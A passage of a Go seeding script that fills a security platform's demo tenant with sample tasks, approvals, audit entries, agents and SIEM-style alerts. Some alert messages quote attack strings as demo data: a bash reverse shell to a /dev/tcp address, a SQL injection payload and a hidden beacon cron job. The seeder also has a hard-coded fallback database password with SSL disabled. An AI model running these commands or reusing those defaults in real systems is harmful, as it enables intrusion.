// Demo data seeder — run once against the demo environment to pre-populate
// the XCloak Security Suite demo tenant (id=9999) with realistic data.
//
// Usage:
//
//	cd xcloak-platform/backend && go run ./cmd/seed/demo
package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/joho/godotenv"
	"github.com/lib/pq"
)

func env(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func mustExec(db *sql.DB, query string, args ...any) {
	if _, err := db.Exec(query, args...); err != nil {
		log.Fatalf("seed error:\n%s\nargs: %v\nerr: %v", query, args, err)
	}
}

func main() {
	godotenv.Load()

	dsn := fmt.Sprintf(
		"host=%s port=%s user=%s password=%s dbname=%s sslmode=disable",
		env("DB_HOST", "localhost"),
		env("DB_PORT", "5432"),
		env("DB_USER", "xcloak"),
		env("DB_PASSWORD", "xcloak"),
		env("DB_NAME", "xcloak"),
	)
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		log.Fatalf("cannot reach database: %v", err)
	}

	log.Println("Seeding demo tenant…")
	seedTenant(db)
	log.Println("Seeding demo agents…")
	agentIDs := seedAgents(db)
	log.Println("Seeding demo alerts…")
	alertIDs := seedAlerts(db, agentIDs)
	log.Println("Seeding demo incidents…")
	incidentIDs := seedIncidents(db, agentIDs)
	log.Println("Seeding demo playbooks…")
	playbookIDs := seedPlaybooks(db, agentIDs, incidentIDs)
	log.Println("Seeding SOAR executions…")
	seedSOARExecutions(db, agentIDs, playbookIDs)
	log.Println("Seeding FIM alerts…")
	seedFIM(db, agentIDs)
	log.Println("Seeding compliance scores…")
	seedCompliance(db)
	log.Println("Seeding endpoint processes…")
	seedProcesses(db, agentIDs)
	log.Println("Seeding IOCs and threat intel…")
	seedIOCs(db)
	log.Println("Seeding threat feeds…")
	seedThreatFeeds(db)
	log.Println("Seeding threat actors…")
	seedThreatActors(db)
	log.Println("Seeding Sigma rules…")
	seedSigmaRules(db)
	log.Println("Seeding YARA rules and matches…")
	seedYaraRules(db, agentIDs)
	log.Println("Seeding firewall rules…")
	seedFirewallRules(db)
	log.Println("Seeding vulnerabilities…")
	seedVulnerabilities(db, agentIDs)
	log.Println("Seeding assets…")
	seedAssets(db, agentIDs)
	log.Println("Seeding cases…")
	seedCases(db, alertIDs, incidentIDs)
	log.Println("Seeding suppression rules…")
	seedSuppressionRules(db)
	log.Println("Seeding quarantine…")
	seedQuarantine(db, agentIDs)
	log.Println("Seeding network anomalies…")
	seedNetworkAnomalies(db, agentIDs)
	log.Println("Seeding UEBA events…")
	seedUEBA(db, agentIDs)
	log.Println("Seeding insider threat scores…")
	seedInsiderThreat(db)
	log.Println("Seeding alert clusters…")
	seedAlertClusters(db, alertIDs)
	log.Println("Seeding JA3 fingerprints…")
	seedJA3(db)
	log.Println("Seeding canary tokens…")
	seedCanary(db, agentIDs)
	log.Println("Seeding hunt templates and runs…")
	seedHunt(db, agentIDs)
	log.Println("Seeding endpoint logs…")
	seedEndpointLogs(db, agentIDs)
	log.Println("Seeding log sources…")
	seedLogSources(db, agentIDs)
	log.Println("Seeding network connections…")
	seedNetworkConnections(db, agentIDs)
	log.Println("Seeding risk posture…")
	seedRiskPosture(db)
	log.Println("Seeding ITDR findings…")
	seedITDR(db, agentIDs)
	log.Println("Seeding DFIR collections…")
	seedDFIR(db, agentIDs, incidentIDs)
	log.Println("Seeding MDM devices…")
	seedMDM(db, agentIDs)
	log.Println("Seeding identity cache…")
	seedIdentity(db)
	log.Println("Seeding correlation rules…")
	seedCorrelation(db)
	log.Println("Seeding honeyports…")
	seedHoneyports(db, agentIDs)
	log.Println("Seeding endpoint users…")
	seedEndpointUsers(db, agentIDs)
	log.Println("Seeding cloud/infra alerts…")
	seedCloudInfraAlerts(db, agentIDs)
	log.Println("Seeding scheduled tasks enterprise…")
	seedScheduledTasksEnterprise(db)
	log.Println("Seeding firewall enterprise…")
	seedFirewallEnterprise(db)
	log.Println("Seeding reports enterprise…")
	seedReportsEnterprise(db)
	log.Println("Seeding framework compliance enterprise…")
	seedFrameworkComplianceEnterprise(db)
	log.Println("Seeding executive enterprise…")
	seedExecutiveEnterprise(db)
	log.Println("Seeding SOC metrics enterprise…")
	seedSOCMetricsEnterprise(db)
	log.Println("Seeding assets CMDB enterprise…")
	seedAssetsCMDBEnterprise(db)
	log.Println("Seeding MDM enterprise…")
	seedMDMEnterprise(db)
	log.Println("Seeding AI assistant enterprise…")
	seedAIAssistantEnterprise(db)
	log.Println("Seeding settings enterprise…")
	seedSettingsEnterprise(db)
	log.Println("Seeding tenants enterprise…")
	seedTenantsEnterprise(db)
	log.Println("Demo seed complete.")
}

func seedScheduledTasksEnterprise(db *sql.DB) {
	const tid = 9999
	now := time.Now()

	mustExec(db, `CREATE TABLE IF NOT EXISTS ste_tasks (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, task_id TEXT NOT NULL,
		name TEXT NOT NULL, description TEXT, category TEXT NOT NULL DEFAULT 'security_operations',
		task_type TEXT NOT NULL DEFAULT 'script_execution', script_language TEXT,
		status TEXT NOT NULL DEFAULT 'active', owner TEXT, priority TEXT NOT NULL DEFAULT 'medium',
		schedule_type TEXT NOT NULL DEFAULT 'cron', cron_expr TEXT, schedule_config TEXT DEFAULT '{}',
		target_type TEXT NOT NULL DEFAULT 'all', target_ids TEXT DEFAULT '[]',
		trigger_conditions TEXT DEFAULT '[]', max_runtime INTEGER DEFAULT 3600,
		retry_attempts INTEGER DEFAULT 3, retry_delay INTEGER DEFAULT 60,
		timeout INTEGER DEFAULT 300, parallel BOOLEAN DEFAULT FALSE, concurrency_limit INTEGER DEFAULT 5,
		dependencies TEXT DEFAULT '[]', requires_approval BOOLEAN DEFAULT FALSE, approval_policy TEXT,
		tags TEXT DEFAULT '[]', enabled BOOLEAN DEFAULT TRUE,
		last_run_at TIMESTAMP, next_run_at TIMESTAMP, run_count INTEGER DEFAULT 0,
		success_count INTEGER DEFAULT 0, failure_count INTEGER DEFAULT 0, avg_duration INTEGER DEFAULT 0,
		created_by TEXT NOT NULL DEFAULT 'system', created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS ste_executions (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, execution_id TEXT NOT NULL,
		task_id TEXT NOT NULL, task_name TEXT NOT NULL,
		start_time TIMESTAMP DEFAULT NOW(), end_time TIMESTAMP, duration INTEGER,
		status TEXT NOT NULL DEFAULT 'running', trigger TEXT NOT NULL DEFAULT 'scheduled',
		executed_by TEXT NOT NULL DEFAULT 'system', target_count INTEGER DEFAULT 0,
		success_count INTEGER DEFAULT 0, failure_count INTEGER DEFAULT 0,
		output_logs TEXT, error_message TEXT, exit_code INTEGER, created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS ste_approvals (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, task_id TEXT NOT NULL,
		task_name TEXT NOT NULL, execution_id TEXT, requester TEXT NOT NULL, approver TEXT,
		status TEXT NOT NULL DEFAULT 'pending', reason TEXT, decision_note TEXT,
		policy TEXT NOT NULL DEFAULT 'manual', decided_at TIMESTAMP, expires_at TIMESTAMP,
		created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS ste_notifications (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, task_id TEXT, task_name TEXT,
		event_type TEXT NOT NULL, message TEXT NOT NULL, severity TEXT NOT NULL DEFAULT 'info',
		read BOOLEAN DEFAULT FALSE, created_at TIMESTAMP DEFAULT NOW()
	)`)
	mustExec(db, `CREATE TABLE IF NOT EXISTS ste_audit (
		id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, task_id TEXT, task_name TEXT,
		action TEXT NOT NULL, actor TEXT NOT NULL, details TEXT, created_at TIMESTAMP DEFAULT NOW()
	)`)

	type task struct {
		taskID, name, desc, category, taskType, scriptLang, owner, priority string
		scheduleType, cronExpr, targetType                                   string
		requiresApproval                                                      bool
		approvalPolicy, tags                                                  string
		maxRuntime, runCount, successCount, failureCount, avgDuration        int
		lastMinsAgo, nextMinsFromNow                                          int
	}

	tasks := []task{
		{"ST-001001", "Daily Threat Hunt — All Endpoints", "Comprehensive threat hunt across all endpoints using IOC feeds and behavioral analysis", "security_operations", "threat_hunt", "", "alice@corp.com", "high", "cron", "0 2 * * *", "all", false, "", `["threat-hunt","daily","production"]`, 7200, 45, 44, 1, 3240, 22*60, -2*60},
		{"ST-001002", "IOC Search — Threat Intel Feeds", "Cross-reference all endpoint logs against latest threat intelligence IOC feeds", "security_operations", "ioc_search", "", "bob@corp.com", "critical", "cron", "0 */4 * * *", "all", false, "", `["ioc","threat-intel","critical"]`, 3600, 180, 175, 5, 1820, 3*60, 1*60},
		{"ST-001003", "Weekly Full Vulnerability Scan", "Complete vulnerability assessment across all managed endpoints and services", "security_operations", "vulnerability_scan", "", "alice@corp.com", "high", "cron", "0 3 * * 0", "all", true, "production_systems", `["vuln-scan","weekly","production"]`, 14400, 12, 11, 1, 9600, 5*24*60, 2*24*60},
		{"ST-001004", "SOC Executive Report", "Generate weekly SOC metrics and executive summary for leadership", "reporting", "executive_report", "", "charlie@corp.com", "medium", "cron", "0 7 * * 1", "all", false, "", `["reporting","executive","weekly"]`, 1800, 20, 20, 0, 950, 7*24*60, 7*24*60},
		{"ST-001005", "PowerShell — Collect Auth Logs", "Collect Windows Security event logs from all Windows endpoints via PowerShell", "security_operations", "powershell", "powershell", "alice@corp.com", "high", "cron", "*/30 * * * *", "multiple_endpoints", false, "", `["collection","windows","auth-logs"]`, 600, 2880, 2860, 20, 45, 25, 5},
		{"ST-001006", "Database Cleanup — Audit Tables", "Remove audit log entries older than 90 days to manage storage", "system_maintenance", "database_cleanup", "", "ops@corp.com", "low", "cron", "0 1 1 * *", "all", true, "bulk_operations", `["maintenance","database","monthly"]`, 3600, 8, 8, 0, 1200, 15*24*60, 14*24*60},
		{"ST-001007", "Asset Discovery Scan", "Discover new assets across network segments and update CMDB", "security_operations", "asset_discovery", "", "bob@corp.com", "medium", "cron", "0 0 * * *", "all", false, "", `["asset-discovery","daily"]`, 7200, 60, 58, 2, 4500, 24*60, 23*60},
		{"ST-001008", "Compliance Scan — CIS Benchmarks", "Assess endpoint compliance against CIS benchmark controls", "compliance", "compliance_scan", "", "charlie@corp.com", "high", "cron", "0 4 * * 3", "all", true, "critical_infrastructure", `["compliance","cis","weekly"]`, 10800, 16, 15, 1, 7800, 4*24*60, 3*24*60},
		{"ST-001009", "Bash — Log Rotation", "Rotate and compress application logs on Linux servers", "system_maintenance", "bash", "bash", "ops@corp.com", "low", "cron", "0 0 * * *", "multiple_endpoints", false, "", `["maintenance","logs","linux"]`, 300, 90, 89, 1, 38, 24*60, 23*60},
		{"ST-001010", "Incident Response — Collect Memory", "Collect memory dumps from endpoints flagged in active incidents", "incident_response", "memory_collection", "", "alice@corp.com", "critical", "event_based", "", "single_endpoint", true, "production_systems", `["ir","memory","forensics"]`, 7200, 3, 3, 0, 5400, 7*24*60 + 3*60, 0},
		{"ST-001011", "Python — Vuln Report Generator", "Generate detailed vulnerability reports using Python data analysis", "reporting", "python", "python", "charlie@corp.com", "medium", "cron", "0 6 * * 5", "all", false, "", `["reporting","vuln","python"]`, 1800, 24, 23, 1, 780, 2*24*60, 5*24*60},
		{"ST-001012", "Index Optimization — Elasticsearch", "Optimize Elasticsearch indices for better search performance", "system_maintenance", "index_optimization", "", "ops@corp.com", "low", "cron", "0 3 * * 6", "all", false, "", `["maintenance","elasticsearch","weekly"]`, 5400, 10, 10, 0, 3200, 6*24*60, 6*24*60},
		{"ST-001013", "Network Diagnostics — Firewall Check", "Verify firewall rules and test network connectivity across segments", "security_operations", "network_diagnostics", "", "bob@corp.com", "medium", "cron", "0 */12 * * *", "all", false, "", `["network","firewall","diagnostics"]`, 600, 42, 41, 1, 280, 11*60, 1*60},
		{"ST-001014", "Backup — Critical Config Files", "Backup critical system and application configuration files", "system_maintenance", "backup", "", "ops@corp.com", "high", "cron", "0 1 * * *", "all", true, "critical_infrastructure", `["backup","config","daily"]`, 3600, 55, 54, 1, 1800, 23*60, 1*60},
		{"ST-001015", "Webhook — SIEM Event Push", "Push critical security events to external SIEM via webhook integration", "custom", "webhook", "", "alice@corp.com", "critical", "cron", "*/5 * * * *", "all", false, "", `["integration","siem","webhook"]`, 60, 8640, 8620, 20, 8, 3, -2},
		{"ST-001016", "Health Check — All Agents", "Verify agent connectivity and collect health metrics across all endpoints", "system_maintenance", "health_check", "", "ops@corp.com", "medium", "cron", "*/10 * * * *", "all", false, "", `["health","agents","monitoring"]`, 120, 4320, 4315, 5, 15, 8, 2},
		{"ST-001017", "Playbook — Ransomware Response", "Execute automated ransomware response playbook on triggered alerts", "incident_response", "playbook_execution", "", "alice@corp.com", "critical", "event_based", "", "single_endpoint", true, "destructive_tasks", `["playbook","ransomware","ir","automated"]`, 7200, 2, 2, 0, 6300, 30*24*60, 0},
		{"ST-001018", "Compliance Report — SOC2", "Generate SOC2 compliance evidence report for audit trail", "reporting", "compliance_report", "", "charlie@corp.com", "high", "cron", "0 5 1 * *", "all", false, "", `["compliance","soc2","reporting","monthly"]`, 5400, 6, 6, 0, 3600, 30*24*60, 30*24*60},
	}

	for _, t := range tasks {
		lastRun := now.Add(-time.Duration(t.lastMinsAgo) * time.Minute)
		nextRun := now.Add(time.Duration(t.nextMinsFromNow) * time.Minute)
		enabled := true
		if t.taskID == "ST-001010" || t.taskID == "ST-001017" {
			enabled = false // event-based, no next_run
		}
		var nextRunPtr *time.Time
		if t.nextMinsFromNow != 0 {
			nextRunPtr = &nextRun
		}
		if enabled && t.nextMinsFromNow != 0 {
			nextRunPtr = &nextRun
		}
		_ = nextRunPtr
		if _, err := db.Exec(`INSERT INTO ste_tasks
			(tenant_id,task_id,name,description,category,task_type,script_language,status,owner,priority,
			schedule_type,cron_expr,schedule_config,target_type,target_ids,trigger_conditions,
			max_runtime,retry_attempts,retry_delay,timeout,parallel,concurrency_limit,
			dependencies,requires_approval,approval_policy,tags,enabled,
			last_run_at,next_run_at,run_count,success_count,failure_count,avg_duration,created_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,'active',$8,$9,$10,$11,'{}','all','[]','[]',
			$12,3,60,300,false,5,'[]',$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,'system')
			ON CONFLICT DO NOTHING`,
			tid, t.taskID, t.name, t.desc, t.category, t.taskType, t.scriptLang, t.owner, t.priority,
			t.scheduleType, t.cronExpr, t.maxRuntime, t.requiresApproval, t.approvalPolicy, t.tags, enabled,
			lastRun, nextRunPtr, t.runCount, t.successCount, t.failureCount, t.avgDuration,
		); err != nil {
			log.Printf("ste_tasks insert warning: %v", err)
		}
	}

	triggers := []struct {
		execID, taskID, taskName, status, trigger, by string
		minsAgo, duration, exitCode                    int
	}{
		{"EX-00100001", "ST-001001", "Daily Threat Hunt — All Endpoints", "completed", "scheduled", "system", 22*60, 3240000, 0},
		{"EX-00100002", "ST-001001", "Daily Threat Hunt — All Endpoints", "completed", "scheduled", "system", 46*60, 3180000, 0},
		{"EX-00100003", "ST-001001", "Daily Threat Hunt — All Endpoints", "failed", "scheduled", "system", 70*60, 1200000, 1},
		{"EX-00100004", "ST-001002", "IOC Search — Threat Intel Feeds", "completed", "scheduled", "system", 4*60, 1820000, 0},
		{"EX-00100005", "ST-001002", "IOC Search — Threat Intel Feeds", "completed", "scheduled", "system", 8*60, 1750000, 0},
		{"EX-00100006", "ST-001003", "Weekly Full Vulnerability Scan", "completed", "manual", "alice@corp.com", 5*24*60, 9600000, 0},
		{"EX-00100007", "ST-001004", "SOC Executive Report", "completed", "scheduled", "system", 7*24*60, 950000, 0},
		{"EX-00100008", "ST-001005", "PowerShell — Collect Auth Logs", "completed", "scheduled", "system", 30, 45000, 0},
		{"EX-00100009", "ST-001005", "PowerShell — Collect Auth Logs", "completed", "scheduled", "system", 60, 47000, 0},
		{"EX-00100010", "ST-001005", "PowerShell — Collect Auth Logs", "failed", "scheduled", "system", 90, 12000, 1},
		{"EX-00100011", "ST-001007", "Asset Discovery Scan", "completed", "scheduled", "system", 24*60, 4500000, 0},
		{"EX-00100012", "ST-001013", "Network Diagnostics — Firewall Check", "completed", "scheduled", "system", 12*60, 280000, 0},
		{"EX-00100013", "ST-001015", "Webhook — SIEM Event Push", "completed", "scheduled", "system", 5, 8000, 0},
		{"EX-00100014", "ST-001016", "Health Check — All Agents", "completed", "scheduled", "system", 10, 15000, 0},
		{"EX-00100015", "ST-001016", "Health Check — All Agents", "running", "scheduled", "system", 0, 0, -1},
	}

	for _, e := range triggers {
		startTime := now.Add(-time.Duration(e.minsAgo) * time.Minute)
		var endTime *time.Time
		var dur *int
		var exit *int
		if e.status != "running" {
			et := startTime.Add(time.Duration(e.duration) * time.Millisecond)
			endTime = &et
			dur = &e.duration
			if e.exitCode >= 0 {
				exit = &e.exitCode
			}
		}
		sc := 1
		fc := 0
		if e.status == "failed" {
			sc = 0
			fc = 1
		}
		if _, err := db.Exec(`INSERT INTO ste_executions
			(tenant_id,execution_id,task_id,task_name,start_time,end_time,duration,status,trigger,executed_by,target_count,success_count,failure_count,exit_code)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,1,$11,$12,$13) ON CONFLICT DO NOTHING`,
			tid, e.execID, e.taskID, e.taskName, startTime, endTime, dur, e.status, e.trigger, e.by, sc, fc, exit,
		); err != nil {
			log.Printf("ste_executions insert warning: %v", err)
		}
	}

	approvals := []struct {
		taskID, taskName, requester, approver, status, policy, note string
		minsAgo                                                       int
		decided                                                       bool
	}{
		{"ST-001003", "Weekly Full Vulnerability Scan", "alice@corp.com", "", "pending", "production_systems", "", 15, false},
		{"ST-001006", "Database Cleanup — Audit Tables", "ops@corp.com", "admin@corp.com", "approved", "bulk_operations", "Reviewed and approved. Off-hours window confirmed.", 30 * 24 * 60, true},
		{"ST-001008", "Compliance Scan — CIS Benchmarks", "charlie@corp.com", "admin@corp.com", "approved", "critical_infrastructure", "Approved for Wednesday maintenance window.", 21 * 24 * 60, true},
		{"ST-001010", "Incident Response — Collect Memory", "alice@corp.com", "", "pending", "production_systems", "", 45, false},
		{"ST-001014", "Backup — Critical Config Files", "ops@corp.com", "admin@corp.com", "approved", "critical_infrastructure", "Standard backup approved.", 7 * 24 * 60, true},
		{"ST-001017", "Playbook — Ransomware Response", "alice@corp.com", "admin@corp.com", "rejected", "destructive_tasks", "Requires additional review. Escalate to IR team first.", 14 * 24 * 60, true},
	}

	for _, a := range approvals {
		createdAt := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		expiresAt := createdAt.Add(24 * time.Hour)
		var decidedAt *time.Time
		var approver *string
		var decisionNote *string
		if a.decided {
			da := createdAt.Add(2 * time.Hour)
			decidedAt = &da
			approver = &a.approver
			decisionNote = &a.note
		}
		if _, err := db.Exec(`INSERT INTO ste_approvals
			(tenant_id,task_id,task_name,requester,approver,status,decision_note,policy,decided_at,expires_at,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) ON CONFLICT DO NOTHING`,
			tid, a.taskID, a.taskName, a.requester, approver, a.status, decisionNote, a.policy, decidedAt, expiresAt, createdAt,
		); err != nil {
			log.Printf("ste_approvals insert warning: %v", err)
		}
	}

	notifications := []struct {
		taskID, taskName, eventType, message, severity string
		minsAgo                                         int
		read                                            bool
	}{
		{"ST-001005", "PowerShell — Collect Auth Logs", "task_failed", "Task 'PowerShell — Collect Auth Logs' failed on web-prod-01: exit code 1", "critical", 90, true},
		{"ST-001003", "Weekly Full Vulnerability Scan", "approval_required", "Task 'Weekly Full Vulnerability Scan' requires approval before execution", "warning", 15, false},
		{"ST-001010", "Incident Response — Collect Memory", "approval_required", "Task 'Incident Response — Collect Memory' requires approval before execution", "warning", 45, false},
		{"ST-001001", "Daily Threat Hunt — All Endpoints", "task_completed", "Task 'Daily Threat Hunt — All Endpoints' completed successfully in 54 minutes", "info", 22*60, true},
		{"ST-001002", "IOC Search — Threat Intel Feeds", "task_completed", "Task 'IOC Search — Threat Intel Feeds' completed: 3 IOC matches found", "info", 4*60, false},
		{"ST-001016", "Health Check — All Agents", "task_started", "Task 'Health Check — All Agents' started — checking 4 agents", "info", 0, false},
		{"ST-001017", "Playbook — Ransomware Response", "approval_rejected", "Task 'Playbook — Ransomware Response' rejected by admin@corp.com: escalate to IR team first", "warning", 14*24*60, true},
		{"ST-001003", "Weekly Full Vulnerability Scan", "schedule_modified", "Schedule for 'Weekly Full Vulnerability Scan' updated by alice@corp.com", "info", 2*24*60, true},
	}

	for _, n := range notifications {
		createdAt := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		if _, err := db.Exec(`INSERT INTO ste_notifications
			(tenant_id,task_id,task_name,event_type,message,severity,read,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8) ON CONFLICT DO NOTHING`,
			tid, n.taskID, n.taskName, n.eventType, n.message, n.severity, n.read, createdAt,
		); err != nil {
			log.Printf("ste_notifications insert warning: %v", err)
		}
	}

	auditEntries := []struct {
		taskID, taskName, action, actor, details string
		minsAgo                                   int
	}{
		{"ST-001001", "Daily Threat Hunt — All Endpoints", "created", "alice@corp.com", "Task created with cron schedule", 30 * 24 * 60},
		{"ST-001003", "Weekly Full Vulnerability Scan", "created", "alice@corp.com", "Task created requiring approval", 28 * 24 * 60},
		{"ST-001005", "PowerShell — Collect Auth Logs", "created", "alice@corp.com", "Task created for Windows endpoints", 25 * 24 * 60},
		{"ST-001015", "Webhook — SIEM Event Push", "created", "ops@corp.com", "Integration task created", 20 * 24 * 60},
		{"ST-001006", "Database Cleanup — Audit Tables", "approval_requested", "ops@corp.com", "Requested approval for monthly cleanup", 30*24*60 + 30},
		{"ST-001006", "Database Cleanup — Audit Tables", "approved", "admin@corp.com", "Reviewed and approved. Off-hours window confirmed.", 30 * 24 * 60},
		{"ST-001003", "Weekly Full Vulnerability Scan", "modified", "alice@corp.com", "Updated schedule from bi-weekly to weekly", 2 * 24 * 60},
		{"ST-001017", "Playbook — Ransomware Response", "approval_requested", "alice@corp.com", "Requested approval for ransomware response playbook", 14*24*60 + 60},
		{"ST-001017", "Playbook — Ransomware Response", "rejected", "admin@corp.com", "Requires additional review. Escalate to IR team first.", 14 * 24 * 60},
		{"ST-001010", "Incident Response — Collect Memory", "approval_requested", "alice@corp.com", "Requested approval for memory collection on flagged endpoint", 45},
		{"ST-001002", "IOC Search — Threat Intel Feeds", "executed", "system", "Scheduled execution completed: 3 IOC matches", 4 * 60},
		{"ST-001001", "Daily Threat Hunt — All Endpoints", "executed", "system", "Scheduled execution completed successfully", 22 * 60},
		{"ST-001005", "PowerShell — Collect Auth Logs", "executed", "system", "Scheduled execution failed: exit code 1 on web-prod-01", 90},
	}

	for _, a := range auditEntries {
		createdAt := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		if _, err := db.Exec(`INSERT INTO ste_audit (tenant_id,task_id,task_name,action,actor,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT DO NOTHING`,
			tid, a.taskID, a.taskName, a.action, a.actor, a.details, createdAt,
		); err != nil {
			log.Printf("ste_audit insert warning: %v", err)
		}
	}
}

func seedTenant(db *sql.DB) {
	mustExec(db, `
		INSERT INTO tenants (id, name, slug, is_active)
		VALUES (9999, 'Demo Corp Security', 'demo-corp', true)
		ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, is_active = true
	`)
	mustExec(db, `SELECT setval('tenants_id_seq', (SELECT GREATEST(last_value, 10000) FROM tenants_id_seq))`)
}

func seedAgents(db *sql.DB) []int {
	agents := []struct {
		hostname  string
		os        string
		ip        string
		status    string
		machineID string
	}{
		{"web-prod-01", "linux", "10.0.1.10", "online", "demo-machine-001"},
		{"db-server-02", "linux", "10.0.1.20", "online", "demo-machine-002"},
		{"win-workstation-05", "windows", "10.0.2.55", "online", "demo-machine-003"},
		{"android-mobile-01", "android", "192.168.1.88", "online", "demo-machine-004"},
	}

	var ids []int
	for _, a := range agents {
		var id int
		err := db.QueryRow(`
			INSERT INTO agents (hostname, os, ip_address, status, last_seen, machine_id, token, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,9999)
			ON CONFLICT (machine_id) DO UPDATE
				SET status=EXCLUDED.status, last_seen=EXCLUDED.last_seen, tenant_id=9999
			RETURNING id`,
			a.hostname, a.os, a.ip, a.status,
			time.Now().Add(-2*time.Minute), a.machineID, "demo-tok-"+a.machineID,
		).Scan(&id)
		if err != nil {
			log.Printf("agent %s: %v", a.hostname, err)
			continue
		}
		ids = append(ids, id)
		mustExec(db, `
			INSERT INTO agent_health (agent_id, health_score, health_status, last_heartbeat)
			VALUES ($1,$2,'healthy',$3)
			ON CONFLICT (agent_id) DO UPDATE
				SET health_score=EXCLUDED.health_score, last_heartbeat=EXCLUDED.last_heartbeat`,
			id, 75+len(ids)*5, time.Now().Add(-2*time.Minute),
		)
	}
	return ids
}

func seedAlerts(db *sql.DB, agentIDs []int) []int {
	if len(agentIDs) == 0 {
		return nil
	}
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		status    string
		minsAgo   int
	}
	alerts := []alert{
		{0, "critical", "C2 Beacon Detected", "Outbound beacon to 185.220.101.47:443 every 60s — matches Cobalt Strike jitter profile", "Command and Control", "T1071.001", "Application Layer Protocol: Web Protocols", "open", 5},
		{0, "high", "Port Scan Detected", "TCP SYN sweep from 10.0.1.10 across 10.0.0.0/24 — 254 hosts in 2 seconds", "Discovery", "T1046", "Network Service Discovery", "open", 12},
		{1, "critical", "SQL Injection Attempt", "Payload in POST /api/users: 1' OR '1'='1 — blocked by WAF rule #442", "Initial Access", "T1190", "Exploit Public-Facing Application", "open", 18},
		{2, "high", "Credential Dump — LSASS", "mimikatz.exe accessed lsass.exe (pid 584) — NTLM hashes extracted", "Credential Access", "T1003.001", "OS Credential Dumping: LSASS Memory", "open", 23},
		{1, "high", "Suspicious Data Exfiltration", "15 MB transferred to 94.102.49.190 via HTTPS — possible exfil", "Exfiltration", "T1048", "Exfiltration Over Alternative Protocol", "investigating", 31},
		{0, "medium", "FIM: /etc/passwd Modified", "/etc/passwd changed — new entry for user svc_backdoor detected", "Persistence", "T1136.001", "Create Account: Local Account", "open", 45},
		{2, "medium", "PowerShell Encoded Command", "Base64 -EncodedCommand detected — execution bypass technique", "Execution", "T1059.001", "Command and Scripting Interpreter: PowerShell", "open", 67},
		{0, "high", "SSH Brute Force", "42 failed auth attempts from 45.33.32.156 in 60 seconds", "Credential Access", "T1110.001", "Brute Force: Password Guessing", "resolved", 90},
		{1, "medium", "Suspicious Cron Job", "New crontab: */5 * * * * /tmp/.hidden/beacon — persistence indicator", "Persistence", "T1053.003", "Scheduled Task/Job: Cron", "open", 102},
		{3, "low", "USB Debugging Enabled", "Android device USB debugging active — elevated attack surface", "Defense Evasion", "T1562", "Impair Defenses", "open", 110},
		{2, "critical", "Ransomware File Pattern", "Mass .encrypted rename — 847 files in 30s on /var/data", "Impact", "T1486", "Data Encrypted for Impact", "investigating", 125},
		{0, "medium", "DNS Tunneling Detected", "Long TXT queries to evil-domain.xyz — matches iodine profile", "Command and Control", "T1071.004", "Application Layer Protocol: DNS", "open", 140},
		{1, "low", "Weak TLS Negotiated", "TLSv1.0 with 203.0.113.42 — deprecated protocol", "Defense Evasion", "T1573", "Encrypted Channel", "open", 155},
		{0, "high", "SUID Binary Modified", "SUID set on /usr/local/bin/custom_helper — priv-esc risk", "Privilege Escalation", "T1548.001", "Abuse Elevation Control: Setuid/Setgid", "open", 168},
		{2, "medium", "Scheduled Task: Persistence", "Task WindowsUpdate_Helper runs cmd.exe at logon", "Persistence", "T1053.005", "Scheduled Task/Job: Scheduled Task", "resolved", 200},
		{1, "low", "Event Log Cleared", "Security log cleared (Event ID 1102) by SYSTEM", "Defense Evasion", "T1070.001", "Indicator Removal: Clear Windows Event Logs", "open", 220},
		{0, "medium", "Reverse Shell Detected", "bash -i >& /dev/tcp/192.168.1.99/4444 executed", "Execution", "T1059.004", "Unix Shell Interpreter", "investigating", 240},
		{3, "low", "Rooting Tool Found", "Magisk socket at /dev/.magisk — device may be rooted", "Defense Evasion", "T1562", "Impair Defenses", "open", 260},
		{1, "high", "Unsigned Kernel Module", "rootkit_helper.ko loaded — system integrity risk", "Persistence", "T1547.006", "Kernel Modules and Extensions", "open", 280},
		{0, "medium", "Impossible Travel Login", "Login from Nigeria — no history of this location for user admin", "Initial Access", "T1078", "Valid Accounts", "resolved", 300},
		{2, "low", "Windows Defender Disabled", "Real-time protection disabled via registry key", "Defense Evasion", "T1562.001", "Disable or Modify Tools", "open", 320},
		{0, "high", "JA3 Fingerprint Match", "JA3=769,47-53-5-10-49171:0-65281:23 matches Metasploit payload", "Command and Control", "T1071", "Application Layer Protocol", "open", 340},
		{1, "medium", "Macro Execution Detected", "cmd.exe spawned by winword.exe — Office macro execution", "Execution", "T1204.002", "User Execution: Malicious File", "open", 360},
		{3, "low", "Unknown App Installed", "com.hacker.spyware installed from unknown source", "Initial Access", "T1476", "Deliver Malicious App", "open", 380},
		{2, "medium", "Pass-the-Hash Attempt", "NTLM hash reuse from 10.0.2.55 to dc-01 — lateral movement", "Lateral Movement", "T1550.002", "Pass the Hash", "investigating", 400},
	}

	var ids []int
	for i, a := range alerts {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
